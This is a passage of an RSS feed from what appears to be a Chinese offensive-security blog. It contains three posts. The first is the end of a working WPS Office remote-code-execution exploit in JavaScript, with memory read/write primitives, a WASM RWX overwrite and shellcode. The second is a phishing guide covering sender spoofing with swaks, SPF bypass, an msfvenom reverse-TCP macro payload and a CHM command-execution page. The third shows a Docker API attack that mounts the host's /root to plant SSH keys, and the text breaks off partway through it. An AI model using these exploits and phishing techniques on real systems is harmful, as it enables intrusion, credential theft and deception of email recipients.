class="number">0</span>], addr);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> val = dv.<span class="title function_">getUint32</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">oob_array[bk_idx] = <span class="title function_">u2d</span>(r8[<span class="number">0</span>], r8[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> val;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">set_32</span>(<span class="params">addr, val</span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> r8 = <span class="title function_">d2u</span>(oob_array[bk_idx]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (bk_idx_flag === <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">oob_array[bk_idx] = <span class="title function_">u2d</span>(addr, r8[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">oob_array[bk_idx] = <span class="title function_">u2d</span>(r8[<span class="number">0</span>], addr);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dv.<span class="title function_">setUint32</span>(<span class="number">0</span>, val, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">oob_array[bk_idx] = <span class="title function_">u2d</span>(r8[<span class="number">0</span>], r8[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write8</span>(<span class="params">addr, val</span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> r8 = <span class="title function_">d2u</span>(oob_array[bk_idx]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (bk_idx_flag === <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">oob_array[bk_idx] = <span class="title function_">u2d</span>(addr, r8[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">oob_array[bk_idx] = <span class="title function_">u2d</span>(r8[<span class="number">0</span>], addr);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dv.<span class="title function_">setUint8</span>(<span class="number">0</span>, val);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> fake_length = <span class="title function_">get_32</span>(<span class="title function_">addrof</span>(oob_array)+<span class="number">12</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">set_32</span>(<span class="title function_">get_32</span>(<span class="title function_">addrof</span>(oob_array)+<span class="number">8</span>)+<span class="number">4</span>,fake_length);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> wasm_code = <span class="keyword">new</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span></span><br><span class="line"></span><br><span class="line">,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> wasm_mod = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> wasm_instance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasm_mod);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> f = wasm_instance.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> target_addr = <span class="title function_">addrof</span>(wasm_instance)+<span class="number">0x40</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> rwx_mem = <span class="title function_">get_32</span>(target_addr);</span><br><span class="line"></span><br><span class="line"><span class="comment">//alert(&quot;rwx_mem is&quot;+rwx_mem.toString(16));</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> shellcode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0xfc</span>, <span class="number">0xe8</span>, <span class="number">0x82</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x60</span>, <span class="number">0x89</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0xe5</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x64</span>, <span class="number">0x8b</span>, <span class="number">0x50</span>, <span class="number">0x30</span>,<span class="number">0x8b</span>, <span class="number">0x52</span>, <span class="number">0x0c</span>, <span class="number">0x8b</span>, <span class="number">0x52</span>, <span class="number">0x14</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x8b</span>, <span class="number">0x72</span>, <span class="number">0x28</span>, <span class="number">0x0f</span>, <span class="number">0xb7</span>, <span class="number">0x4a</span>, <span class="number">0x26</span>, <span class="number">0x31</span>, <span class="number">0xff</span>,<span class="number">0xac</span>, <span class="number">0x3c</span>, <span class="number">0x61</span>, <span class="number">0x7c</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x02</span>, <span class="number">0x2c</span>, <span class="number">0x20</span>, <span class="number">0xc1</span>, <span class="number">0xcf</span>, <span class="number">0x0d</span>, <span class="number">0x01</span>, <span class="number">0xc7</span>, <span class="number">0xe2</span>, <span class="number">0xf2</span>, <span class="number">0x52</span>,<span class="number">0x57</span>, <span class="number">0x8b</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x52</span>, <span class="number">0x10</span>, <span class="number">0x8b</span>, <span class="number">0x4a</span>, <span class="number">0x3c</span>, <span class="number">0x8b</span>, <span class="number">0x4c</span>, <span class="number">0x11</span>, <span class="number">0x78</span>, <span class="number">0xe3</span>, <span class="number">0x48</span>, <span class="number">0x01</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0xd1</span>,<span class="number">0x51</span>, <span class="number">0x8b</span>, <span class="number">0x59</span>, <span class="number">0x20</span>, <span class="number">0x01</span>, <span class="number">0xd3</span>, <span class="number">0x8b</span>, <span class="number">0x49</span>, <span class="number">0x18</span>, <span class="number">0xe3</span>, <span class="number">0x3a</span>, <span class="number">0x49</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x8b</span>, <span class="number">0x34</span>, <span class="number">0x8b</span>,<span class="number">0x01</span>, <span class="number">0xd6</span>, <span class="number">0x31</span>, <span class="number">0xff</span>, <span class="number">0xac</span>, <span class="number">0xc1</span>, <span class="number">0xcf</span>, <span class="number">0x0d</span>, <span class="number">0x01</span>, <span class="number">0xc7</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x38</span>, <span class="number">0xe0</span>, <span class="number">0x75</span>, <span class="number">0xf6</span>, <span class="number">0x03</span>,<span class="number">0x7d</span>, <span class="number">0xf8</span>, <span class="number">0x3b</span>, <span class="number">0x7d</span>, <span class="number">0x24</span>, <span class="number">0x75</span>, <span class="number">0xe4</span>, <span class="number">0x58</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x8b</span>, <span class="number">0x58</span>, <span class="number">0x24</span>, <span class="number">0x01</span>, <span class="number">0xd3</span>, <span class="number">0x66</span>, <span class="number">0x8b</span>,<span class="number">0x0c</span>, <span class="number">0x4b</span>, <span class="number">0x8b</span>, <span class="number">0x58</span>, <span class="number">0x1c</span>, <span class="number">0x01</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0xd3</span>, <span class="number">0x8b</span>, <span class="number">0x04</span>, <span class="number">0x8b</span>, <span class="number">0x01</span>, <span class="number">0xd0</span>, <span class="number">0x89</span>, <span class="number">0x44</span>, <span class="number">0x24</span>,<span class="number">0x24</span>, <span class="number">0x5b</span>, <span class="number">0x5b</span>, <span class="number">0x61</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x59</span>, <span class="number">0x5a</span>, <span class="number">0x51</span>, <span class="number">0xff</span>, <span class="number">0xe0</span>, <span class="number">0x5f</span>, <span class="number">0x5f</span>, <span class="number">0x5a</span>, <span class="number">0x8b</span>, <span class="number">0x12</span>, <span class="number">0xeb</span>,<span class="number">0x8d</span>, <span class="number">0x5d</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x6a</span>, <span class="number">0x01</span>, <span class="number">0x8d</span>, <span class="number">0x85</span>, <span class="number">0xb2</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x50</span>, <span class="number">0x68</span>, <span class="number">0x31</span>, <span class="number">0x8b</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x6f</span>,<span class="number">0x87</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0xbb</span>, <span class="number">0xe0</span>, <span class="number">0x1d</span>, <span class="number">0x2a</span>, <span class="number">0x0a</span>, <span class="number">0x68</span>, <span class="number">0xa6</span>, <span class="number">0x95</span>, <span class="number">0xbd</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x9d</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>,<span class="number">0x3c</span>, <span class="number">0x06</span>, <span class="number">0x7c</span>, <span class="number">0x0a</span>, <span class="number">0x80</span>, <span class="number">0xfb</span>, <span class="number">0xe0</span>, <span class="number">0x75</span>, <span class="number">0x05</span>, <span class="number">0xbb</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x47</span>, <span class="number">0x13</span>, <span class="number">0x72</span>, <span class="number">0x6f</span>, <span class="number">0x6a</span>,<span class="number">0x00</span>, <span class="number">0x53</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x63</span>, <span class="number">0x61</span>, <span class="number">0x6c</span>, <span class="number">0x63</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x00</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;shellcode.<span class="property">length</span>;i++)&#123;</span><br><span class="line"></span><br><span class="line"><span class="title function_">write8</span>(rwx_mem+i,shellcode[i]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">f</span>();</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>需要将在1.html当前路径下启动http server并监听80端口，修改hosts文件（测试写死的）</p><p>127.0.0.1 <a href="http://clientweb.docer.wps.cn.cloudwps.cn/">clientweb.docer.wps.cn.cloudwps.cn</a></p><p><a href="http://漏洞触发需让域名规则满足clientweb.docer.wps.cn/">漏洞触发需让域名规则满足clientweb.docer.wps.cn</a>.{xxxxx}wps.cn即可，cloudwps.cn和wps.cn没有任何关系。正常攻击，<a href="http://也可以使用clientweb.docer.wps.cn.hellowps.cn/">也可以使用clientweb.docer.wps.cn.hellowps.cn</a>.</p><p><strong>说明</strong></p><p><strong>资料搜集来源于互联网，仅做技术分享与hvv威胁情报预警，切勿用于违法行为。</strong></p><h1 id="每日更新漏洞情报-一键三连加关注"><a href="#每日更新漏洞情报-一键三连加关注" class="headerlink" title="每日更新漏洞情报   一键三连加关注"></a>每日更新漏洞情报   一键三连加关注</h1><h1 id="微信公众号"><a href="#微信公众号" class="headerlink" title="微信公众号"></a>微信公众号</h1><p><img src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F15a7bed4-43b3-40c8-8d2f-cdf07b0e354c%2FUntitled.png?table=block&id=94f1ad77-b3ed-459f-9552-2bad08adf475&spaceId=c83b5e26-6112-4af3-b822-de3746064a99&name=Untitled.png&userId=31606ab3-eb91-448c-9776-acb1215f91c2&cache=v2" alt="Untitled"></p></div></div></div><div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>啊，再见了，再见了，哈</p></div><div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>我们会再见的对么</p></div><div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>再见你要幸福</p></div><div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>燕子，燕子</p></div>]]></content:encoded>
      
      
      <category domain="https://0a00.github.io/categories/hvv/">hvv</category>
      
      <category domain="https://0a00.github.io/categories/hvv/rce/">rce</category>
      
      
      <category domain="https://0a00.github.io/tags/hvv/">hvv</category>
      
      <category domain="https://0a00.github.io/tags/rce/">rce</category>
      
      <category domain="https://0a00.github.io/tags/poc/">poc</category>
      
      
      <comments>https://0a00.github.io/2023/08/20/hvv2023wps-rce/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>邮件钓鱼上线</title>
      <link>https://0a00.github.io/2023/05/19/mailfish/</link>
      <guid>https://0a00.github.io/2023/05/19/mailfish/</guid>
      <pubDate>Fri, 19 May 2023 13:53:26 GMT</pubDate>
      
      <description>邮件钓鱼攻击，邮件伪造，社会工程学</description>
      
      
      
      <content:encoded><![CDATA[<div class="note red icon-padding flat"><i class="note-icon fas fa-fan"></i><p>奇奇怪怪</p></div><div class="note orange icon-padding flat"><i class="note-icon fas fa-battery-half"></i><p>安全小技巧</p></div><div class="note blue icon-padding flat"><i class="note-icon fas fa-bullhorn"></i><p>新的一天开始了</p></div><div class="note purple icon-padding flat"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布,哈，我又赢了 </p></div><div class="timeline pink"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2023</p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>05-19</p></div></div><div class='timeline-item-content'><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>邮件渗透技术</p><h1 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p><strong><strong>方式一：</strong></strong></p><ul><li>寻找目标邮件服务器以及 web 端邮箱入口</li><li>获取目标 web 网站，拿到真实 ip （如 MX 记录获取真实ip，第三方邮件服务器此方式失效）</li><li>随后对获取到的目标真实 ip 进行 C 段扫描。针对目标常用邮件协议端口25,109,110,143,465,995,993,994 。</li></ul><p><strong>方式二：</strong></p><ul><li>通过子域名扫描，获取目标子域名，从中筛选出可能与邮件服务有关的域名</li></ul><p><strong><strong><strong><strong><strong><strong>方式三：</strong></strong></strong></strong></strong></strong></p><ul><li>通过搜索引擎语法爬取</li></ul><p>site:target.com intitle:”Outlook Web App”</p><p>site:target.com intitle:”mail”</p><p>site:target.com intitle:”webmail”</p><p>Shodan、fofa、zoomeye搜索等。</p><ul><li>第三方网站批量搜集目标邮箱</li></ul><p><a href="https://hunter.io/">https://hunter.io/</a></p><p><a href="http://www.skymem.info/">http://www.skymem.info/</a></p><p><a href="https://www.email-format.com/i/search/">https://www.email-format.com/i/search/</a></p><p><a href="https://github.com/laramies/theHarvester">https://github.com/laramies/theHarvester</a> 邮件信息侦查工具，kali 集成</p><h1 id="验证邮件地址"><a href="#验证邮件地址" class="headerlink" title="验证邮件地址"></a>验证邮件地址</h1><p><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>通过工具查询邮件地址是否存在</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p><ul><li><a href="https://mailtester.com/testmail.php">https://mailtester.com/testmail.php</a></li><li><a href="https://github.com/Tzeross/verifyemail">https://github.com/Tzeross/verifyemail</a></li></ul><h1 id="邮箱爆破"><a href="#邮箱爆破" class="headerlink" title="邮箱爆破"></a>邮箱爆破</h1><ul><li>如果目标邮箱并非第三方邮箱，如百度，新浪，阿里，腾讯等等邮箱，可以使用密码爆破的手段获取目标邮箱密码，进行钓鱼。</li></ul><h1 id="临时邮件"><a href="#临时邮件" class="headerlink" title="临时邮件"></a>临时邮件</h1><ul><li><a href="https://www.linshi-email.com/">https://www.linshi-email.com/</a></li><li><a href="https://mail.cx/zh/">https://mail.cx/zh/</a></li></ul><h1 id="邮件伪造"><a href="#邮件伪造" class="headerlink" title="邮件伪造"></a>邮件伪造</h1><ul><li>SPF: 可以大致理解它的作用是确认邮件的ip地址到底是不是在它域名的spf记录里面，如果在的话，就说明一封正确的邮件，不是的话就会被丢弃。SPF是为了防范垃圾邮件而提出来的一种DNS记录类型，它是一种TXT类型的记录，它用于登记某个域名拥有的用来外发邮件的所有IP地址。</li><li>DKIM:它的作用主要是来校验邮件数据在传输过程中是否被修改过，也可以简单的理解为确保邮件在发送过程中的完整性。主要步骤：</li></ul><ol><li>发件人域名签名：发件人通过私钥对邮件头和正文进行数字签名，并将签名结果添加到邮件头中。</li><li>DNS记录验证：接收邮件服务器在收到邮件后，会从DNS记录中获取发件人域名的公钥，用于验证邮件头中的签名结果是否正确。</li><li>签名验证：邮件接收方使用公钥验证邮件头中的签名结果，并对比签名前后的邮件头和正文内容是否一致，以确定邮件来源是否被篡改或伪造。</li></ol><p><strong>方式：</strong></p><ul><li>一般情况下没有SPF可以 直接用swaks工具伪造。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">swaks --body <span class="string">&quot;test111 mail 内容&quot;</span> --header <span class="string">&quot;subject:mail title标题&quot;</span> --ehlo <span class="string">&quot;mail ehlo head&quot;</span>  -t lfpqjqqmrl@iubridge.com  -f admin@qq.com</span><br><span class="line">使用swaks 发送邮件</span><br><span class="line">参数说明</span><br><span class="line">swaks –to <span class="built_in">test</span>@qq.com //首先测试邮箱的连通性；</span><br><span class="line"></span><br><span class="line">            –to <span class="built_in">test</span>@gmail.com //接件人邮箱；</span><br><span class="line">            –from <span class="built_in">test</span>@qq.com //发件人邮箱；</span><br><span class="line">            –ehlo qq.com //伪造邮件ehlo头，即是发件人邮箱的域名。提供身份认证；</span><br><span class="line">            –server mail.smtp2go.com //服务邮件域</span><br><span class="line">            –body “<span class="built_in">test</span>” //引号中的内容即为邮件正文，可直接引用文件；</span><br><span class="line">            –data ./Desktop/email.txt //将正常源邮件的内容保存成TXT文件，再作为正常邮件发送；</span><br><span class="line">            –header “Subject:标题” //邮件标题;</span><br><span class="line">            –header-X-Mailer gmail.com //X-Mailer标头表示用于起草和发送原始电子邮件的程序</span><br><span class="line">            –h-From: ‘boss admin@gmail.com‘ //伪造的发件人邮箱；</span><br><span class="line">            –attach /root/test.txt //附件</span><br></pre></td></tr></table></figure><h1 id="SPF-绕过"><a href="#SPF-绕过" class="headerlink" title="SPF 绕过"></a>SPF 绕过</h1><p>在有SPF的情况下，就需要绕过SPF,可以使用swaks+smtp2go，需要借助到邮件托管平台来绕过SPF监测。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">swaks --to xxx@163.com </span><br><span class="line">--from  admin@gov.com  </span><br><span class="line">--ehlo  xxx  </span><br><span class="line">--body  “hello ，i<span class="string">&#x27;m 007&quot;</span></span><br><span class="line"><span class="string">--server mail.smtp2go.com -p 2525 -au user -ap pass</span></span><br><span class="line"><span class="string">使用邮件托管平台代发绕过</span></span><br></pre></td></tr></table></figure><h1 id="钓鱼文件"><a href="#钓鱼文件" class="headerlink" title="钓鱼文件"></a>钓鱼文件</h1><ul><li>宏文件</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">可以使用Metasploit中的msfvenom来生成带有恶意宏的Word文档。</span><br><span class="line">下面是一个简单的示例步骤：</span><br><span class="line"></span><br><span class="line">1.生成payload：使用msfvenom生成恶意的payload。例如，要生成一个Meterpreter的payload，输入以下命令：</span><br><span class="line"></span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;attacker IP&gt; LPORT=&lt;attacker port&gt; -f vba &gt; payload.vba</span><br><span class="line"></span><br><span class="line">其中，LHOST参数为攻击者IP地址，LPORT参数为攻击者监听的端口号。</span><br><span class="line"></span><br><span class="line">2.编写Word文档：创建一个新的Word文档，并添加一个宏。在宏中，使用ActiveDocument.VBProject.VBComponents.Import方法将生成的payload.vba导入到Word文档中。</span><br><span class="line"></span><br><span class="line">3.发送邮件：将带有恶意宏的Word文档作为附件发送给目标用户。</span><br></pre></td></tr></table></figure><ul><li>伪造扩展名 kilerrat 工具</li><li>文件捆绑</li><li>CHM钓鱼</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">**CHM简介**</span><br><span class="line"></span><br><span class="line">CHM是微软推出的基于HTML的帮助文件系统，被 IE 浏览器支持的JavaScript, VBScript, ActiveX,等</span><br><span class="line">CHM同样支持。因此使用CHM作为钓鱼的payload非常合适。本文总结了两种基于CHM执行命令的方式。</span><br><span class="line"></span><br><span class="line">************************************使用com控件命令执行</span><br><span class="line">使用了js调用com控件执行命令</span><br><span class="line">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;<span class="built_in">head</span>&gt;&lt;title&gt;Mousejack replay&lt;/title&gt;&lt;<span class="built_in">head</span>&gt;&lt;/head&gt;&lt;body&gt;</span><br><span class="line"><span class="built_in">command</span> <span class="built_in">exec</span> </span><br><span class="line">&lt;OBJECT <span class="built_in">id</span>=x classid=<span class="string">&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot;</span> width=1 height=1&gt;</span><br><span class="line">&lt;PARAM name=<span class="string">&quot;Command&quot;</span> value=<span class="string">&quot;ShortCut&quot;</span>&gt;</span><br><span class="line"> &lt;PARAM name=<span class="string">&quot;Button&quot;</span> value=<span class="string">&quot;Bitmap::shortcut&quot;</span>&gt;</span><br><span class="line"> &lt;PARAM name=<span class="string">&quot;Item1&quot;</span> value=<span class="string">&#x27;,calc.exe&#x27;</span>&gt;</span><br><span class="line"> &lt;PARAM name=<span class="string">&quot;Item2&quot;</span> value=<span class="string">&quot;273,1,1&quot;</span>&gt;</span><br><span class="line">&lt;/OBJECT&gt;</span><br><span class="line">&lt;SCRIPT&gt;</span><br><span class="line">x.Click();</span><br><span class="line">&lt;/SCRIPT&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;************************************</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>CVE-2018-2174</li><li>Windows 快捷键</li><li>构造DDE钓鱼文档</li><li>word 中插入外部对象(OLE)方式欺骗</li><li>IQY特性钓鱼</li><li>PPT 动作按钮特性构造 PPSX钓鱼</li><li>RAR解压钓鱼</li></ul><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ul><li><a href="https://mp.weixin.qq.com/s/aatNjey3swZz7T4Yw_LqsQ">https://mp.weixin.qq.com/s/aatNjey3swZz7T4Yw_LqsQ</a></li></ul></div></div></div><div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>啊，再见了，再见了，哈</p></div><div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>我们会再见的对么</p></div><div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>再见你要幸福</p></div><div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>燕子，燕子</p></div>]]></content:encoded>
      
      
      <category domain="https://0a00.github.io/categories/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/">社会工程学</category>
      
      <category domain="https://0a00.github.io/categories/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC/">邮件钓鱼</category>
      
      
      <category domain="https://0a00.github.io/tags/%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC/">邮件钓鱼</category>
      
      
      <comments>https://0a00.github.io/2023/05/19/mailfish/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Docker 未授权访问</title>
      <link>https://0a00.github.io/2023/05/18/Docker/</link>
      <guid>https://0a00.github.io/2023/05/18/Docker/</guid>
      <pubDate>Thu, 18 May 2023 10:50:43 GMT</pubDate>
      
      <description>Docker 未授权访问</description>
      
      
      
      <content:encoded><![CDATA[<div class="note red icon-padding flat"><i class="note-icon fas fa-fan"></i><p>奇奇怪怪</p></div><div class="note orange icon-padding flat"><i class="note-icon fas fa-battery-half"></i><p>安全小技巧</p></div><div class="note blue icon-padding flat"><i class="note-icon fas fa-bullhorn"></i><p>新的一天开始了</p></div><div class="note purple icon-padding flat"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布,哈，我又赢了 </p></div><div class="timeline red"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2023</p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>05-18</p></div></div><div class='timeline-item-content'><h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><ul><li>Docker Remote API 是一个取代远程命令行界面（rcli）的REST API。通过 docker client 或者 http 直接请求就可以访问这个 API，通过这个接口，我们可以新建 container，删除已有 container，甚至是获取宿主机的 shell</li></ul><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><ul><li>vulhub靶场环境</li><li>docker-compose build<br>docker-compose up -d</li><li>环境启动后，将监听2375端口。</li><li>测试多个环境启动失败，最后使用官方靶场推荐环境，ubuntu20.04 正常启动</li></ul><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">http://xxx:2375/version  查看版本信息</span><br><span class="line">http://xxx:2375/info  查看info信息</span><br><span class="line">http://host:2375/containers/json 当前服务器运行容器列表信息</span><br><span class="line"></span><br><span class="line">使用命令远程连接目标执行docker 指令</span><br><span class="line">docker -H tcp://xxx:2375 images 返回远程目标的 images 信息，也可以执行其他docker命令</span><br><span class="line"></span><br><span class="line">**获取宿主机权限**</span><br><span class="line"></span><br><span class="line">远程命令运行容器并且使用 -v 参数将宿主机 /root 目录挂载到容器 /mnt/setc 目录</span><br><span class="line">随后可以将生成 ssh 公钥私钥，将公钥写入目标 /root/.ssh/authorized_keys 文件</span><br><span class="line">随后使用私钥登陆</span><br><span class="line">docker -H tcp://192.168.56.117:2375 run -it -v /root:/mnt/setc alpine:latest 